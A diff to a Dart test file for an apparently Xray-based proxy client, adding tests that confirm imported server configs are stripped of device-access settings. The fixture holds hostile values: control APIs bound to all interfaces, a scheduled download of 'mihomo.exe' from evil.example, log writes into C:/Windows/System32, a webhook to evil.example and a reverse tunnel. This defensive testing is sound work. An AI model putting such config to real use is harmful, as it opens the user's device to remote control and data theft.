@@ -72,6 +72,38 @@ const _singboxWithServers = '''
 }
 ''';
 
+/// Готовый конфиг, который просит у ядра не связь с сервером, а доступ к
+/// устройству: порты управления, окружение, перезапись файлов, вход в локалку.
+const _greedyConfig = '''
+{
+  "remarks": "greedy",
+  "api": {"tag": "api", "listen": "0.0.0.0:10085", "services": ["HandlerService", "RoutingService"]},
+  "metrics": {"tag": "metrics", "listen": "0.0.0.0:11111"},
+  "env": {"GODEBUG": "tlsrsakex=1", "XRAY_LOCATION_ASSET": "C:/Windows"},
+  "geodata": {"cron": "* * * * *", "outbound": "proxy", "assets": [{"url": "https://evil.example/x", "file": "mihomo.exe"}]},
+  "reverse": {"bridges": [{"tag": "bridge", "domain": "r.example"}]},
+  "log": {"access": "C:/Windows/System32/x.txt", "error": "/data/x", "loglevel": "debug", "dnsLog": true},
+  "policy": {"levels": {"0": {"handshake": 4}}},
+  "stats": {},
+  "observatory": {"subjectSelector": ["proxy"], "probeUrl": "https://www.google.com/generate_204"},
+  "burstObservatory": {"subjectSelector": ["proxy"], "pingConfig": {"destination": "https://www.google.com/generate_204", "interval": "1m"}},
+  "version": {"min": "25.0.0"},
+  "routing": {
+    "script": "route.lua",
+    "rules": [
+      {"type": "field", "domain": ["domain:example.org"], "outboundTag": "direct", "webhook": {"url": "https://evil.example/hook"}},
+      {"type": "field", "network": "tcp,udp", "outboundTag": "proxy"}
+    ]
+  },
+  "outbounds": [
+    {"tag": "proxy", "protocol": "vless", "settings": {"address": "nl1.example.com", "port": 443, "id": "5783a3e7-e373-51cd-8642-c83782b807c5", "encryption": "none", "reverse": {"tag": "r-in"}}, "streamSettings": {"network": "tcp", "security": "tls"}},
+    {"tag": "direct", "protocol": "freedom", "settings": {"domainStrategy": "UseIPv4"}}
+  ]
+}
+''';
+
+const _deviceKeys = ['api', 'metrics', 'env', 'geodata', 'reverse'];
+
 Map<String, dynamic> _decode(String raw) =>
     jsonDecode(raw) as Map<String, dynamic>;
 
@@ -564,6 +596,85 @@ void main() {
         (config['outbounds'] as List).last,
         {'protocol': 'freedom', 'tag': 'keq-ping-direct'},
       );
+    });
+  });
+
+  group('чужой конфиг не получает доступа к устройству', () {
+    const settings = AppSettings(
+      localPort: 2080,
+      httpPort: 2081,
+      xrayCore: XrayCoreSettings(logLevel: 'info'),
+    );
+
+    test('в сессию не идут порты, окружение, файлы и обратный прокси', () {
+      final config = _decode(
+        ConfigGeneratorV2.generateConfig(_greedyConfig, settings),
+      );
+
+      for (final key in _deviceKeys) {
+        expect(config.containsKey(key), isFalse, reason: key);
+      }
+      expect(config['log'], {'loglevel': 'info'});
+
+      final routing = config['routing'] as Map;
+      expect(routing.containsKey('script'), isFalse);
+      expect(_rules(config).any((r) => r.containsKey('webhook')), isFalse);
+      // само правило автора остаётся, пропадает только отправка
+      expect(
+        _rules(config).where((r) => r['ruleTag'] == null).first['domain'],
+        ['domain:example.org'],
+      );
+
+      final proxy = ((config['outbounds'] as List).first as Map)['settings'] as Map;
+      expect(proxy.containsKey('reverse'), isFalse);
+      expect(proxy['address'], 'nl1.example.com');
+    });
+
+    test('безобидное автора остаётся как было', () {
+      final config = _decode(
+        ConfigGeneratorV2.generateConfig(_greedyConfig, settings),
+      );
+      final author = _decode(_greedyConfig);
+      for (final key in [
+        'policy',
+        'stats',
+        'observatory',
+        'burstObservatory',
+        'version',
+      ]) {
+        expect(config[key], author[key], reason: key);
+      }
+    });
+
+    test('проба пинга идёт без обратного прокси', () {
+      final config = _decode(
+        ConfigGeneratorV2.generatePingConfig(
+          _greedyConfig,
+          settings,
+          socksPort: 28150,
+          resolvedServerIp: '203.0.113.9',
+        ),
+      );
+      for (final key in _deviceKeys) {
+        expect(config.containsKey(key), isFalse, reason: key);
+      }
+      expect(jsonEncode(config['outbounds']), isNot(contains('reverse')));
+    });
+
+    test('выход для маршрута по приложениям идёт без обратного прокси', () {
+      final outbounds =
+          CustomXrayConfig.tryParse(_greedyConfig)!.routeOutbounds('route-1')!;
+      expect(jsonEncode(outbounds), isNot(contains('reverse')));
+      expect(outbounds.single['tag'], 'route-1');
+    });
+
+    test('сохранённый конфиг сервера не переписывается', () {
+      final custom = CustomXrayConfig.tryParse(_greedyConfig)!;
+      final before = custom.encode();
+      custom.buildSessionConfig(inbounds: const [], logLevel: 'info');
+      custom.buildPingConfig(inbounds: const [], rules: const []);
+      custom.routeOutbounds('route-1');
+      expect(custom.encode(), before);
     });
   });
 }
